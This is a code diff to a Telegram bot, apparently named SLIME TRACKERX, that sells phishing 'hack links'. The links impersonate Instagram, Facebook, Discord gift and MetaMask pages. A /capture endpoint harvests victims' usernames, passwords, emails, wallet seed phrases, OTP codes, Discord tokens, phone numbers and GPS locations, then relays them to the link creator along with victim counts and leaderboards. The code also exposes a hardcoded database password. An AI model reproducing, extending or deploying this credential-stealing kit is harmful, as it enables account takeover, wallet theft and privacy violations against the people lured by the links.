@@ -15,14 +15,13 @@ const CHANNEL = "@devxtechzone";
 const OWNER_ID = 7271063368;
 const TOOL_COST = 15;
 const REF_REWARD = 15;
-const MENU_IMAGE = "https://files.catbox.moe/xcqa0q.jpeg";
 
 // ========== MONGODB ==========
 const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/slimev1?retryWrites=true&w=majority";
 
 mongoose.connect(MONGODB_URI)
-  .then(() => console.log('✅ DB Connected'))
-  .catch(err => console.log('❌ DB Error:', err));
+  .then(() => console.log('DB Connected'))
+  .catch(err => console.log('DB Error:', err));
 
 // ========== SCHEMAS ==========
 const userSchema = new mongoose.Schema({
@@ -78,17 +77,17 @@ async function deleteOldMessage(chatId, messageId) {
 
 bot.use(async (ctx, next) => {
   if (!ctx.from) return next();
-  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned");
+  if (bannedUsers.has(ctx.from.id)) return ctx.reply("You are banned");
   if (ctx.callbackQuery && ctx.callbackQuery.data == "check_join") return next();
   
   if (!(await checkJoin(ctx.from.id))) {
     const msg = await ctx.reply(
-      "🚫 JOIN CHANNEL FIRST 🚫\n\nJoin " + CHANNEL + " to use hacking tools",
+      "JOIN CHANNEL FIRST\n\nJoin " + CHANNEL + " to use hacking tools",
       {
         reply_markup: {
           inline_keyboard: [
-            [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
-            [{ text: "✅ I JOINED", callback_data: "check_join" }]
+            [{ text: "JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
+            [{ text: "I JOINED", callback_data: "check_join" }]
           ]
         }
       }
@@ -101,12 +100,12 @@ bot.use(async (ctx, next) => {
 
 bot.action("check_join", async (ctx) => {
   if (await checkJoin(ctx.from.id)) {
-    await ctx.answerCbQuery("✅ Access granted");
+    await ctx.answerCbQuery("Access granted");
     await ctx.deleteMessage().catch(() => {});
     await initUser(ctx.from.id);
     await sendMenu(ctx);
   } else {
-    await ctx.answerCbQuery("❌ Not a member", true);
+    await ctx.answerCbQuery("Not a member", true);
   }
 });
 
@@ -131,7 +130,7 @@ async function initUser(userId, referrerId = null) {
         referrer.coins += REF_REWARD;
         referrer.referrals += 1;
         await referrer.save();
-        bot.telegram.sendMessage(referrerId, "🎉 New referral! +" + REF_REWARD + " coins\n👥 Total referrals: " + referrer.referrals);
+        bot.telegram.sendMessage(referrerId, "New referral! +" + REF_REWARD + " coins");
       }
     }
   }
@@ -164,12 +163,12 @@ function getRefLink(userId) {
   return "https://t.me/" + (bot.botInfo?.username || "SlimeTrackerBot") + "?start=ref_" + userId;
 }
 
-// ========== CREATE HACK TOOL (1 HOUR EXPIRY) ==========
+// ========== CREATE HACK TOOL ==========
 async function createHackTool(userId, type, label) {
   const user = await initUser(userId);
   
   if (user.coins < TOOL_COST) {
-    return { error: "❌ Need " + TOOL_COST + " coins! You have " + user.coins };
+    return { error: "Need " + TOOL_COST + " coins! You have " + user.coins };
   }
   
   await removeCoins(userId, TOOL_COST);
@@ -181,7 +180,6 @@ async function createHackTool(userId, type, label) {
   let hackUrl = "";
   if (type == "instagram") hackUrl = "https://instagr.am/p/" + shortToken;
   else if (type == "facebook") hackUrl = "https://fb.watch/" + shortToken;
-  else if (type == "discord") hackUrl = "https://discord.gg/" + shortToken;
   else if (type == "tokengrab") hackUrl = "https://discord.gift/" + shortToken;
   else if (type == "crypto") hackUrl = "https://metamask.io/verify/" + shortToken;
   else if (type == "giveaway") hackUrl = "https://prize.link/" + shortToken;
@@ -211,10 +209,7 @@ async function createHackTool(userId, type, label) {
   usersCache.set(userId, user);
   
   setTimeout(async () => {
-    const expiredTool = await Tool.findOne({ token: token });
-    if (expiredTool && new Date() > expiredTool.expiresAt) {
-      await fs.remove(path.join(__dirname, "public", token + ".html")).catch(() => {});
-    }
+    await fs.remove(path.join(__dirname, "public", token + ".html")).catch(() => {});
   }, 60 * 60 * 1000);
   
   return {
@@ -241,8 +236,7 @@ async function sendMenu(ctx) {
 
 ⬇️ SELECT A TOOL ⬇️`;
   
-  const msg = await ctx.replyWithPhoto(MENU_IMAGE, {
-    caption: caption,
+  const msg = await ctx.reply(caption, {
     reply_markup: {
       inline_keyboard: [
         [{ text: "📸 INSTAGRAM", callback_data: "tool_instagram" }, { text: "📘 FACEBOOK", callback_data: "tool_facebook" }],
@@ -276,7 +270,7 @@ for (const t of tools) {
   bot.action("tool_" + t, async (ctx) => {
     await ctx.answerCbQuery();
     userSessions.set(ctx.from.id, { action: "create_" + t });
-    const msg = await ctx.reply("📝 Send a label name for this link:\nExample: free_iphone, instagram_login");
+    const msg = await ctx.reply("Send a label name for this link:\nExample: free_iphone, instagram_login");
     await deleteOldMessage(ctx.chat.id, msg.message_id);
   });
 }
@@ -297,7 +291,7 @@ bot.on("text", async (ctx) => {
     return;
   }
   
-  const msg = await ctx.reply("✅ HACK LINK READY (Expires in 1 hour)\n\n🔗 " + result.url);
+  const msg = await ctx.reply("✅ HACK LINK READY (1 hour expiry)\n\n🔗 " + result.url);
   await deleteOldMessage(ctx.chat.id, msg.message_id);
 });
 
@@ -307,16 +301,16 @@ bot.action("my_links", async (ctx) => {
   const links = await Tool.find({ userId: ctx.from.id }).sort({ createdAt: -1 }).limit(10);
   
   if (links.length == 0) {
-    const msg = await ctx.reply("📭 No active links. Create one from menu!");
+    const msg = await ctx.reply("No active links. Create one from menu!");
     await deleteOldMessage(ctx.chat.id, msg.message_id);
     return;
   }
   
-  let msgText = "💀 YOUR HACK LINKS 💀\n\n";
+  let msgText = "YOUR HACK LINKS:\n\n";
   for (const l of links) {
-    const status = new Date(l.expiresAt) > new Date() ? "✅ ACTIVE" : "❌ EXPIRED";
-    const timeLeft = Math.max(0, Math.floor((new Date(l.expiresAt) - new Date()) / 60000));
-    msgText += `🎯 ${l.label || l.type}\n🔗 ${l.url}\n👆 ${l.clicks} clicks | 📸 ${l.captures} captures\n⏰ Expires in ${timeLeft} mins | ${status}\n\n`;
+    const status = new Date(l.expiresAt) > new Date() ? "ACTIVE" : "EXPIRED";
+    const minsLeft = Math.max(0, Math.floor((new Date(l.expiresAt) - new Date()) / 60000));
+    msgText += `🎯 ${l.label || l.type}\n🔗 ${l.url}\n👆 ${l.clicks} clicks | 📸 ${l.captures} captures\n⏰ ${minsLeft} mins left | ${status}\n\n`;
   }
   const msg = await ctx.reply(msgText);
   await deleteOldMessage(ctx.chat.id, msg.message_id);
@@ -325,14 +319,14 @@ bot.action("my_links", async (ctx) => {
 bot.action("my_balance", async (ctx) => {
   await ctx.answerCbQuery();
   const user = await initUser(ctx.from.id);
-  const msg = await ctx.reply(`💰 YOUR BALANCE 💰\n\n💵 Coins: ${user.coins}\n🎯 Victims: ${user.victims}\n🔧 Tools Used: ${user.totalTools}\n👥 Referrals: ${user.referrals}`);
+  const msg = await ctx.reply(`💰 BALANCE 💰\n\nCoins: ${user.coins}\nVictims: ${user.victims}\nTools Used: ${user.totalTools}\nReferrals: ${user.referrals}`);
   await deleteOldMessage(ctx.chat.id, msg.message_id);
 });
 
 bot.action("my_ref", async (ctx) => {
   await ctx.answerCbQuery();
   const user = await initUser(ctx.from.id);
-  const msg = await ctx.reply(`🔗 REFERRAL PROGRAM 🔗\n\nYour link: ${getRefLink(ctx.from.id)}\n\n👥 Referrals: ${user.referrals}\n💰 Per referral: +${REF_REWARD} coins\n\nShare your link and earn coins instantly!`);
+  const msg = await ctx.reply(`🔗 REFERRAL LINK 🔗\n\n${getRefLink(ctx.from.id)}\n\nReferrals: ${user.referrals}\nPer referral: +${REF_REWARD} coins`);
   await deleteOldMessage(ctx.chat.id, msg.message_id);
 });
 
@@ -342,7 +336,7 @@ bot.action("leaderboard", async (ctx) => {
   let msgText = "🏆 TOP 15 HACKERS 🏆\n\n";
   for (let i = 0; i < topUsers.length; i++) {
     const medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
-    msgText += `${medal} ${i+1}. @${topUsers[i].username} - ${topUsers[i].victims} victims (${topUsers[i].coins} coins)\n`;
+    msgText += `${medal} ${i+1}. @${topUsers[i].username} - ${topUsers[i].victims} victims\n`;
   }
   const msg = await ctx.reply(msgText);
   await deleteOldMessage(ctx.chat.id, msg.message_id);
@@ -351,7 +345,7 @@ bot.action("leaderboard", async (ctx) => {
 bot.action("my_profile", async (ctx) => {
   await ctx.answerCbQuery();
   const user = await initUser(ctx.from.id);
-  const msg = await ctx.reply(`👤 YOUR PROFILE 👤\n\n🆔 ID: ${user.userId}\n💰 Coins: ${user.coins}\n👥 Referrals: ${user.referrals}\n🎯 Victims: ${user.victims}\n🔧 Tools Used: ${user.totalTools}\n📅 Joined: ${user.createdAt.toLocaleDateString()}`);
+  const msg = await ctx.reply(`👤 PROFILE 👤\n\nID: ${user.userId}\nCoins: ${user.coins}\nReferrals: ${user.referrals}\nVictims: ${user.victims}\nTools Used: ${user.totalTools}\nJoined: ${user.createdAt.toLocaleDateString()}`);
   await deleteOldMessage(ctx.chat.id, msg.message_id);
 });
 
@@ -359,12 +353,12 @@ bot.action("my_profile", async (ctx) => {
 bot.action("admin_panel", async (ctx) => {
   const user = await initUser(ctx.from.id);
   if (!user.isAdmin && ctx.from.id != OWNER_ID) {
-    await ctx.answerCbQuery("❌ Admin only!", true);
+    await ctx.answerCbQuery("Admin only!", true);
     return;
   }
   await ctx.answerCbQuery();
   const msg = await ctx.reply(
-    "👑 ADMIN PANEL 👑\n\n/addcoins @user amount\n/removecoins @user amount\n/broadcast message\n/stats\n/users\n/ban @user\n/unban @user\n/setadmin @user\n/remadmin @user\n/clearusers"
+    "👑 ADMIN COMMANDS 👑\n\n/addcoins @user amount\n/removecoins @user amount\n/broadcast message\n/stats\n/users\n/ban @user\n/unban @user\n/setadmin @user\n/remadmin @user"
   );
   await deleteOldMessage(ctx.chat.id, msg.message_id);
 });
@@ -381,12 +375,12 @@ bot.command("addcoins", async (ctx) => {
     if (user.username == username) {
       user.coins += amount;
       await user.save();
-      await ctx.reply(`✅ Added ${amount} coins to @${username}\n💰 New balance: ${user.coins}`);
-      await bot.telegram.sendMessage(id, `👑 Admin gave you +${amount} coins!`);
+      await ctx.reply(`Added ${amount} coins to @${username}\nNew balance: ${user.coins}`);
+      await bot.telegram.sendMessage(id, `Admin gave you +${amount} coins!`);
       return;
     }
   }
-  await ctx.reply("❌ User not found");
+  await ctx.reply("User not found");
 });
 
 bot.command("removecoins", async (ctx) => {
@@ -401,12 +395,12 @@ bot.command("removecoins", async (ctx) => {
       user.coins -= amount;
       if (user.coins < 0) user.coins = 0;
       await user.save();
-      await ctx.reply(`✅ Removed ${amount} coins from @${username}\n💰 New balance: ${user.coins}`);
-      await bot.telegram.sendMessage(id, `👑 Admin removed -${amount} coins!`);
+      await ctx.reply(`Removed ${amount} coins from @${username}\nNew balance: ${user.coins}`);
+      await bot.telegram.sendMessage(id, `Admin removed -${amount} coins!`);
       return;
     }
   }
-  await ctx.reply("❌ User not found");
+  await ctx.reply("User not found");
 });
 
 bot.command("broadcast", async (ctx) => {
@@ -421,7 +415,7 @@ bot.command("broadcast", async (ctx) => {
       sent++;
     } catch(e) {}
   }
-  await ctx.reply(`✅ Broadcast sent to ${sent} users`);
+  await ctx.reply(`Broadcast sent to ${sent} users`);
 });
 
 bot.command("stats", async (ctx) => {
@@ -431,7 +425,7 @@ bot.command("stats", async (ctx) => {
   const totalVictims = (await Tool.find()).reduce((a,b) => a + b.captures, 0);
   const totalCoins = (await User.find()).reduce((a,b) => a + b.coins, 0);
   
-  await ctx.reply(`📊 GLOBAL STATS 📊\n\n👥 Users: ${totalUsers}\n🔗 Links: ${totalLinks}\n🎯 Victims: ${totalVictims}\n💰 Total Coins: ${totalCoins}`);
+  await ctx.reply(`📊 GLOBAL STATS 📊\n\nUsers: ${totalUsers}\nLinks: ${totalLinks}\nVictims: ${totalVictims}\nTotal Coins: ${totalCoins}`);
 });
 
 bot.command("users", async (ctx) => {
@@ -453,12 +447,12 @@ bot.command("ban", async (ctx) => {
   for (let [id, user] of usersCache) {
     if (user.username == username) {
       bannedUsers.add(id);
-      await ctx.reply(`🚫 Banned @${username}`);
-      await bot.telegram.sendMessage(id, "🚫 You have been banned!");
+      await ctx.reply(`Banned @${username}`);
+      await bot.telegram.sendMessage(id, "You have been banned!");
       return;
     }
   }
-  await ctx.reply("❌ User not found");
+  await ctx.reply("User not found");
 });
 
 bot.command("unban", async (ctx) => {
@@ -470,12 +464,12 @@ bot.command("unban", async (ctx) => {
   for (let [id, user] of usersCache) {
     if (user.username == username) {
       bannedUsers.delete(id);
-      await ctx.reply(`✅ Unbanned @${username}`);
-      await bot.telegram.sendMessage(id, "✅ You have been unbanned!");
+      await ctx.reply(`Unbanned @${username}`);
+      await bot.telegram.sendMessage(id, "You have been unbanned!");
       return;
     }
   }
-  await ctx.reply("❌ User not found");
+  await ctx.reply("User not found");
 });
 
 bot.command("setadmin", async (ctx) => {
@@ -488,12 +482,12 @@ bot.command("setadmin", async (ctx) => {
     if (user.username == username) {
       user.isAdmin = true;
       await user.save();
-      await ctx.reply(`✅ @${username} is now admin!`);
-      await bot.telegram.sendMessage(id, "👑 You are now an admin!");
+      await ctx.reply(`@${username} is now admin!`);
+      await bot.telegram.sendMessage(id, "You are now an admin!");
       return;
     }
   }
-  await ctx.reply("❌ User not found");
+  await ctx.reply("User not found");
 });
 
 bot.command("remadmin", async (ctx) => {
@@ -506,19 +500,12 @@ bot.command("remadmin", async (ctx) => {
     if (user.username == username) {
       user.isAdmin = false;
       await user.save();
-      await ctx.reply(`✅ @${username} is no longer admin`);
-      await bot.telegram.sendMessage(id, "👑 You are no longer an admin!");
+      await ctx.reply(`@${username} is no longer admin`);
+      await bot.telegram.sendMessage(id, "You are no longer an admin!");
       return;
     }
   }
-  await ctx.reply("❌ User not found");
-});
-
-bot.command("clearusers", async (ctx) => {
-  if (ctx.from.id != OWNER_ID) return;
-  await User.deleteMany({});
-  usersCache.clear();
-  await ctx.reply("✅ All users cleared!");
+  await ctx.reply("User not found");
 });
 
 // ========== EXPRESS SERVER ==========
@@ -548,19 +535,18 @@ app.post("/capture", async (req, res) => {
       usersCache.set(user.userId, user);
     }
     
-    let msg = `💀 VICTIM CAPTURED! 💀\n\n🔧 Tool: ${tool.type}\n🏷️ Label: ${tool.label || "No label"}\n📱 IP: ${ip}\n`;
-    if (data?.u) msg += `👤 Username: ${data.u}\n`;
-    if (data?.p) msg += `🔑 Password: ${data.p}\n`;
-    if (data?.email) msg += `📧 Email: ${data.email}\n`;
-    if (data?.password) msg += `🔑 Password: ${data.password}\n`;
-    if (data?.seedPhrase) msg += `💎 Seed Phrase: ${data.seedPhrase}\n`;
-    if (data?.otpCode) msg += `🔐 OTP Code: ${data.otpCode}\n`;
-    if (data?.discordToken) msg += `🎮 Discord Token: ${data.discordToken.substring(0, 40)}...\n`;
-    if (data?.name) msg += `👤 Name: ${data.name}\n`;
-    if (data?.phone) msg += `📞 Phone: ${data.phone}\n`;
-    if (data?.address) msg += `🏠 Address: ${data.address}\n`;
-    if (loc?.lat) msg += `📍 GPS: ${loc.lat}, ${loc.lon}\n`;
-    msg += `⏰ Time: ${new Date().toLocaleString()}`;
+    let msg = `💀 VICTIM CAPTURED!\n\nTool: ${tool.type}\nLabel: ${tool.label || "No label"}\nIP: ${ip}\n`;
+    if (data?.u) msg += `Username: ${data.u}\n`;
+    if (data?.p) msg += `Password: ${data.p}\n`;
+    if (data?.email) msg += `Email: ${data.email}\n`;
+    if (data?.password) msg += `Password: ${data.password}\n`;
+    if (data?.seedPhrase) msg += `Seed Phrase: ${data.seedPhrase}\n`;
+    if (data?.otpCode) msg += `OTP Code: ${data.otpCode}\n`;
+    if (data?.discordToken) msg += `Discord Token: ${data.discordToken.substring(0, 40)}...\n`;
+    if (data?.name) msg += `Name: ${data.name}\n`;
+    if (data?.phone) msg += `Phone: ${data.phone}\n`;
+    if (loc?.lat) msg += `GPS: ${loc.lat}, ${loc.lon}\n`;
+    msg += `Time: ${new Date().toLocaleString()}`;
     
     await bot.telegram.sendMessage(tool.userId, msg);
     
@@ -595,20 +581,19 @@ app.get("/p/:token", async (req, res) => {
 
 // ========== START SERVER ==========
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("🚀 Server on port " + PORT));
+app.listen(PORT, () => console.log("Server on port " + PORT));
 
 async function loadData() {
   const users = await User.find({});
   users.forEach(u => usersCache.set(u.userId, u));
-  console.log("📂 Loaded " + usersCache.size + " users");
+  console.log("Loaded " + usersCache.size + " users");
 }
 
 loadData().then(async () => {
   await bot.launch();
-  console.log("🔥 SLIME TRACKERX V1 LIVE!");
-  console.log("✅ Force Join: " + CHANNEL);
-  console.log("💰 Tool Cost: " + TOOL_COST + " coins");
-  console.log("⏰ Links expire in 1 hour");
+  console.log("SLIME TRACKERX V1 LIVE!");
+  console.log("Force Join: " + CHANNEL);
+  console.log("Tool Cost: " + TOOL_COST + " coins");
 });
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
